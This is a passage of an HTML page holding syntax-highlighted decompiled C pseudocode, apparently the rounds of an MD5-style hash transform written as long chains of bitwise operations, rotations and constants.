punctuation">(</span>v17 <span class="token operator">&amp;</span> v15 <span class="token operator">|</span> v13 <span class="token operator">&amp;</span> <span class="token operator">~</span>v17<span class="token punctuation">)</span>                                                                        <span class="token operator">-</span> <span class="token number">45705983</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v18 <span class="token operator">=</span> v13 <span class="token operator">+</span> v125 <span class="token operator">+</span> <span class="token punctuation">(</span>v135 <span class="token operator">&amp;</span> v17 <span class="token operator">|</span> v15 <span class="token operator">&amp;</span> <span class="token operator">~</span>v135<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1770035416</span><span class="token punctuation">;</span>  v19 <span class="token operator">=</span> v135 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v18 <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v18 <span class="token operator">>></span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v20 <span class="token operator">=</span> v15 <span class="token operator">+</span> v126 <span class="token operator">+</span> <span class="token punctuation">(</span>v19 <span class="token operator">&amp;</span> v135 <span class="token operator">|</span> v17 <span class="token operator">&amp;</span> <span class="token operator">~</span>v19<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1958414417</span><span class="token punctuation">;</span>  v21 <span class="token operator">=</span> v19 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v20 <span class="token operator">&lt;&lt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v20 <span class="token operator">>></span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v22 <span class="token operator">=</span> v17 <span class="token operator">+</span> v127 <span class="token operator">+</span> <span class="token punctuation">(</span>v19 <span class="token operator">&amp;</span> v21 <span class="token operator">|</span> v135 <span class="token operator">&amp;</span> <span class="token operator">~</span>v21<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">42063</span><span class="token punctuation">;</span>  v23 <span class="token operator">=</span> v21 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v22 <span class="token operator">&lt;&lt;</span> <span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v22 <span class="token operator">>></span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v136 <span class="token operator">=</span> v23       <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v135 <span class="token operator">+</span> v128 <span class="token operator">+</span> <span class="token punctuation">(</span>v23 <span class="token operator">&amp;</span> v21 <span class="token operator">|</span> v19 <span class="token operator">&amp;</span> <span class="token operator">~</span>v23<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1990404162</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v135                                                                          <span class="token operator">+</span> v128                                                                          <span class="token operator">+</span> <span class="token punctuation">(</span>v23 <span class="token operator">&amp;</span> v21 <span class="token operator">|</span> v19 <span class="token operator">&amp;</span> <span class="token operator">~</span>v23<span class="token punctuation">)</span>                                                                          <span class="token operator">-</span> <span class="token number">1990404162</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v24 <span class="token operator">=</span> v19 <span class="token operator">+</span> v129 <span class="token operator">+</span> <span class="token punctuation">(</span>v136 <span class="token operator">&amp;</span> v23 <span class="token operator">|</span> v21 <span class="token operator">&amp;</span> <span class="token operator">~</span>v136<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1804603682</span><span class="token punctuation">;</span>  v25 <span class="token operator">=</span> v136 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v24 <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v24 <span class="token operator">>></span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v26 <span class="token operator">=</span> v21 <span class="token operator">+</span> v130 <span class="token operator">+</span> <span class="token punctuation">(</span>v25 <span class="token operator">&amp;</span> v136 <span class="token operator">|</span> v23 <span class="token operator">&amp;</span> <span class="token operator">~</span>v25<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">40341101</span><span class="token punctuation">;</span>  v27 <span class="token operator">=</span> v25 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v26 <span class="token operator">&lt;&lt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v26 <span class="token operator">>></span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v28 <span class="token operator">=</span> v23 <span class="token operator">+</span> v131 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">~</span>v27 <span class="token operator">&amp;</span> v136 <span class="token operator">|</span> v25 <span class="token operator">&amp;</span> v27<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1502002290</span><span class="token punctuation">;</span>  v29 <span class="token operator">=</span> v27 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v28 <span class="token operator">&lt;&lt;</span> <span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v28 <span class="token operator">>></span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v137 <span class="token operator">=</span> v29       <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v136 <span class="token operator">+</span> v132 <span class="token operator">+</span> <span class="token punctuation">(</span>v29 <span class="token operator">&amp;</span> v27 <span class="token operator">|</span> v25 <span class="token operator">&amp;</span> <span class="token operator">~</span>v29<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1236535329</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v136                                                                          <span class="token operator">+</span> v132                                                                          <span class="token operator">+</span> <span class="token punctuation">(</span>v29 <span class="token operator">&amp;</span> v27 <span class="token operator">|</span> v25 <span class="token operator">&amp;</span> <span class="token operator">~</span>v29<span class="token punctuation">)</span>                                                                          <span class="token operator">+</span> <span class="token number">1236535329</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v30 <span class="token operator">=</span> v25 <span class="token operator">+</span> v118 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">~</span>v27 <span class="token operator">&amp;</span> v29 <span class="token operator">|</span> v137 <span class="token operator">&amp;</span> v27<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">165796510</span><span class="token punctuation">;</span>  v31 <span class="token operator">=</span> v137 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">*</span> v30<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v30 <span class="token operator">>></span> <span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v32 <span class="token operator">=</span> v27 <span class="token operator">+</span> v123 <span class="token operator">+</span> <span class="token punctuation">(</span>v31 <span class="token operator">&amp;</span> v29 <span class="token operator">|</span> v137 <span class="token operator">&amp;</span> <span class="token operator">~</span>v29<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1069501632</span><span class="token punctuation">;</span>  v33 <span class="token operator">=</span> v31 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v32 <span class="token operator">&lt;&lt;</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v32 <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v34 <span class="token operator">=</span> v29 <span class="token operator">+</span> v128 <span class="token operator">+</span> <span class="token punctuation">(</span>v137 <span class="token operator">&amp;</span> v33 <span class="token operator">|</span> v31 <span class="token operator">&amp;</span> <span class="token operator">~</span>v137<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">643717713</span><span class="token punctuation">;</span>  v35 <span class="token operator">=</span> v33 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v34 <span class="token operator">&lt;&lt;</span> <span class="token number">14</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v34 <span class="token operator">>></span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v138 <span class="token operator">=</span> v35       <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v137 <span class="token operator">+</span> v117 <span class="token operator">+</span> <span class="token punctuation">(</span>v31 <span class="token operator">&amp;</span> v35 <span class="token operator">|</span> v33 <span class="token operator">&amp;</span> <span class="token operator">~</span>v31<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">373897302</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v137                                                                         <span class="token operator">+</span> v117                                                                         <span class="token operator">+</span> <span class="token punctuation">(</span>v31 <span class="token operator">&amp;</span> v35 <span class="token operator">|</span> v33 <span class="token operator">&amp;</span> <span class="token operator">~</span>v31<span class="token punctuation">)</span>                                                                         <span class="token operator">-</span> <span class="token number">373897302</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v36 <span class="token operator">=</span> v31 <span class="token operator">+</span> v122 <span class="token operator">+</span> <span class="token punctuation">(</span>v138 <span class="token operator">&amp;</span> v33 <span class="token operator">|</span> v35 <span class="token operator">&amp;</span> <span class="token operator">~</span>v33<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">701558691</span><span class="token punctuation">;</span>  v37 <span class="token operator">=</span> v138 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">*</span> v36<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v36 <span class="token operator">>></span> <span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v38 <span class="token operator">=</span> v33 <span class="token operator">+</span> v127 <span class="token operator">+</span> <span class="token punctuation">(</span>v37 <span class="token operator">&amp;</span> v35 <span class="token operator">|</span> v138 <span class="token operator">&amp;</span> <span class="token operator">~</span>v35<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">38016083</span><span class="token punctuation">;</span>  v39 <span class="token operator">=</span> v37 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v38 <span class="token operator">&lt;&lt;</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v38 <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v40 <span class="token operator">=</span> v35 <span class="token operator">+</span> v132 <span class="token operator">+</span> <span class="token punctuation">(</span>v138 <span class="token operator">&amp;</span> v39 <span class="token operator">|</span> v37 <span class="token operator">&amp;</span> <span class="token operator">~</span>v138<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">660478335</span><span class="token punctuation">;</span>  v41 <span class="token operator">=</span> v39 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v40 <span class="token operator">&lt;&lt;</span> <span class="token number">14</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v40 <span class="token operator">>></span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v139 <span class="token operator">=</span> v41       <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v138 <span class="token operator">+</span> v121 <span class="token operator">+</span> <span class="token punctuation">(</span>v37 <span class="token operator">&amp;</span> v41 <span class="token operator">|</span> v39 <span class="token operator">&amp;</span> <span class="token operator">~</span>v37<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">405537848</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v138                                                                         <span class="token operator">+</span> v121                                                                         <span class="token operator">+</span> <span class="token punctuation">(</span>v37 <span class="token operator">&amp;</span> v41 <span class="token operator">|</span> v39 <span class="token operator">&amp;</span> <span class="token operator">~</span>v37<span class="token punctuation">)</span>                                                                         <span class="token operator">-</span> <span class="token number">405537848</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v42 <span class="token operator">=</span> v37 <span class="token operator">+</span> v126 <span class="token operator">+</span> <span class="token punctuation">(</span>v139 <span class="token operator">&amp;</span> v39 <span class="token operator">|</span> v41 <span class="token operator">&amp;</span> <span class="token operator">~</span>v39<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">568446438</span><span class="token punctuation">;</span>  v43 <span class="token operator">=</span> v139 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">*</span> v42<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v42 <span class="token operator">>></span> <span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v44 <span class="token operator">=</span> v39 <span class="token operator">+</span> v131 <span class="token operator">+</span> <span class="token punctuation">(</span>v43 <span class="token operator">&amp;</span> v41 <span class="token operator">|</span> v139 <span class="token operator">&amp;</span> <span class="token operator">~</span>v41<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1019803690</span><span class="token punctuation">;</span>  v45 <span class="token operator">=</span> v43 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v44 <span class="token operator">&lt;&lt;</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v44 <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v46 <span class="token operator">=</span> v41 <span class="token operator">+</span> v120 <span class="token operator">+</span> <span class="token punctuation">(</span>v139 <span class="token operator">&amp;</span> v45 <span class="token operator">|</span> v43 <span class="token operator">&amp;</span> <span class="token operator">~</span>v139<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">187363961</span><span class="token punctuation">;</span>  v47 <span class="token operator">=</span> v45 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v46 <span class="token operator">&lt;&lt;</span> <span class="token number">14</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v46 <span class="token operator">>></span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v140 <span class="token operator">=</span> v47       <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v139 <span class="token operator">+</span> v125 <span class="token operator">+</span> <span class="token punctuation">(</span>v43 <span class="token operator">&amp;</span> v47 <span class="token operator">|</span> v45 <span class="token operator">&amp;</span> <span class="token operator">~</span>v43<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1163531501</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v139                                                                          <span class="token operator">+</span> v125                                                                          <span class="token operator">+</span> <span class="token punctuation">(</span>v43 <span class="token operator">&amp;</span> v47 <span class="token operator">|</span> v45 <span class="token operator">&amp;</span> <span class="token operator">~</span>v43<span class="token punctuation">)</span>                                                                          <span class="token operator">+</span> <span class="token number">1163531501</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v48 <span class="token operator">=</span> v43 <span class="token operator">+</span> v130 <span class="token operator">+</span> <span class="token punctuation">(</span>v140 <span class="token operator">&amp;</span> v45 <span class="token operator">|</span> v47 <span class="token operator">&amp;</span> <span class="token operator">~</span>v45<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1444681467</span><span class="token punctuation">;</span>  v49 <span class="token operator">=</span> v140 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">*</span> v48<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v48 <span class="token operator">>></span> <span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v50 <span class="token operator">=</span> v45 <span class="token operator">+</span> v119 <span class="token operator">+</span> <span class="token punctuation">(</span>v49 <span class="token operator">&amp;</span> v47 <span class="token operator">|</span> v140 <span class="token operator">&amp;</span> <span class="token operator">~</span>v47<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">51403784</span><span class="token punctuation">;</span>  v51 <span class="token operator">=</span> v49 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v50 <span class="token operator">&lt;&lt;</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v50 <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v52 <span class="token operator">=</span> v47 <span class="token operator">+</span> v124 <span class="token operator">+</span> <span class="token punctuation">(</span>v140 <span class="token operator">&amp;</span> v51 <span class="token operator">|</span> v49 <span class="token operator">&amp;</span> <span class="token operator">~</span>v140<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1735328473</span><span class="token punctuation">;</span>  v53 <span class="token operator">=</span> v51 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v52 <span class="token operator">&lt;&lt;</span> <span class="token number">14</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v52 <span class="token operator">>></span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v54 <span class="token operator">=</span> v53      <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v140 <span class="token operator">+</span> v129 <span class="token operator">+</span> <span class="token punctuation">(</span>v49 <span class="token operator">&amp;</span> v53 <span class="token operator">|</span> v51 <span class="token operator">&amp;</span> <span class="token operator">~</span>v49<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1926607734</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v140                                                                         <span class="token operator">+</span> v129                                                                         <span class="token operator">+</span> <span class="token punctuation">(</span>v49 <span class="token operator">&amp;</span> v53 <span class="token operator">|</span> v51 <span class="token operator">&amp;</span> <span class="token operator">~</span>v49<span class="token punctuation">)</span>                                                                         <span class="token operator">-</span> <span class="token number">1926607734</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v55 <span class="token operator">=</span> v49 <span class="token operator">+</span> v122 <span class="token operator">+</span> <span class="token punctuation">(</span>v54 <span class="token operator">^</span> v53 <span class="token operator">^</span> v51<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">378558</span><span class="token punctuation">;</span>  v56 <span class="token operator">=</span> v54 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v55<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v55 <span class="token operator">>></span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v57 <span class="token operator">=</span> v56      <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v51 <span class="token operator">+</span> v125 <span class="token operator">+</span> <span class="token punctuation">(</span>v56 <span class="token operator">^</span> v54 <span class="token operator">^</span> v53<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2022574463</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v51 <span class="token operator">+</span> v125 <span class="token operator">+</span> <span class="token punctuation">(</span>v56 <span class="token operator">^</span> v54 <span class="token operator">^</span> v53<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2022574463</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v58 <span class="token operator">=</span> v57      <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v53 <span class="token operator">+</span> v128 <span class="token operator">+</span> <span class="token punctuation">(</span>v56 <span class="token operator">^</span> v54 <span class="token operator">^</span> v57<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1839030562</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v53 <span class="token operator">+</span> v128 <span class="token operator">+</span> <span class="token punctuation">(</span>v56 <span class="token operator">^</span> v54 <span class="token operator">^</span> v57<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1839030562</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v59 <span class="token operator">=</span> v54 <span class="token operator">+</span> v131 <span class="token operator">+</span> <span class="token punctuation">(</span>v56 <span class="token operator">^</span> v58 <span class="token operator">^</span> v57<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">35309556</span><span class="token punctuation">;</span>  v60 <span class="token operator">=</span> v58 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v59 <span class="token operator">>></span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v59 <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v61 <span class="token operator">=</span> v56 <span class="token operator">+</span> v118 <span class="token operator">+</span> <span class="token punctuation">(</span>v60 <span class="token operator">^</span> v58 <span class="token operator">^</span> v57<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1530992060</span><span class="token punctuation">;</span>  v62 <span class="token operator">=</span> v60 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v61<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v61 <span class="token operator">>></span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v63 <span class="token operator">=</span> v57 <span class="token operator">+</span> v121 <span class="token operator">+</span> <span class="token punctuation">(</span>v62 <span class="token operator">^</span> v60 <span class="token operator">^</span> v58<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1272893353</span><span class="token punctuation">;</span>  v64 <span class="token operator">=</span> v62 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v63 <span class="token operator">&lt;&lt;</span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v63 <span class="token operator">>></span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v65 <span class="token operator">=</span> v58 <span class="token operator">+</span> v124 <span class="token operator">+</span> <span class="token punctuation">(</span>v62 <span class="token operator">^</span> v60 <span class="token operator">^</span> v64<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">155497632</span><span class="token punctuation">;</span>  v66 <span class="token operator">=</span> v64 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v65 <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">HIWORD</span><span class="token punctuation">(</span>v65<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v67 <span class="token operator">=</span> v66      <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v60 <span class="token operator">+</span> v127 <span class="token operator">+</span> <span class="token punctuation">(</span>v62 <span class="token operator">^</span> v66 <span class="token operator">^</span> v64<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1094730640</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v60 <span class="token operator">+</span> v127 <span class="token operator">+</span> <span class="token punctuation">(</span>v62 <span class="token operator">^</span> v66 <span class="token operator">^</span> v64<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1094730640</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v68 <span class="token operator">=</span> v67      <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v62 <span class="token operator">+</span> v130 <span class="token operator">+</span> <span class="token punctuation">(</span>v67 <span class="token operator">^</span> v66 <span class="token operator">^</span> v64<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">681279174</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v62 <span class="token operator">+</span> v130 <span class="token operator">+</span> <span class="token punctuation">(</span>v67 <span class="token operator">^</span> v66 <span class="token operator">^</span> v64<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">681279174</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v69 <span class="token operator">=</span> v64 <span class="token operator">+</span> v117 <span class="token operator">+</span> <span class="token punctuation">(</span>v68 <span class="token operator">^</span> v67 <span class="token operator">^</span> v66<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">358537222</span><span class="token punctuation">;</span>  v70 <span class="token operator">=</span> v68 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v69 <span class="token operator">&lt;&lt;</span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v69 <span class="token operator">>></span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v71 <span class="token operator">=</span> v66 <span class="token operator">+</span> v120 <span class="token operator">+</span> <span class="token punctuation">(</span>v68 <span class="token operator">^</span> v67 <span class="token operator">^</span> v70<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">722521979</span><span class="token punctuation">;</span>  v72 <span class="token operator">=</span> v70 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v71 <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">HIWORD</span><span class="token punctuation">(</span>v71<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v73 <span class="token operator">=</span> v72 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v67 <span class="token operator">+</span> v123 <span class="token operator">+</span> <span class="token punctuation">(</span>v68 <span class="token operator">^</span> v72 <span class="token operator">^</span> v70<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">76029189</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v67 <span class="token operator">+</span> v123 <span class="token operator">+</span> <span class="token punctuation">(</span>v68 <span class="token operator">^</span> v72 <span class="token operator">^</span> v70<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">76029189</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v74 <span class="token operator">=</span> v73      <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v68 <span class="token operator">+</span> v126 <span class="token operator">+</span> <span 